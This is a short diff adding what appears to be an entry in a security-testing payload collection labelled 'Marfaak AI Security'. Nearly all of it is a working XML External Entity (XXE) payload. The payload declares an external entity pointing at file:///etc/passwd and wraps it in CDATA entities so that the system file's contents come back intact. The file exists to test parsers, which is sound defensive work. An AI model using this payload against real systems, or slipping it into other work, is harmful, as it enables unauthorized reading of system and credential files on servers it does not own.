@@ -1,0 +1,11 @@
+# Marfaak AI Security - XXE with CDATA wrapping
+
+**WARNING: This payload tests XXE with CDATA wrapping.**
+
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY start "<![CDATA[">
+  <!ENTITY end "]]>">
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<data>&start;&xxe;&end;</data>
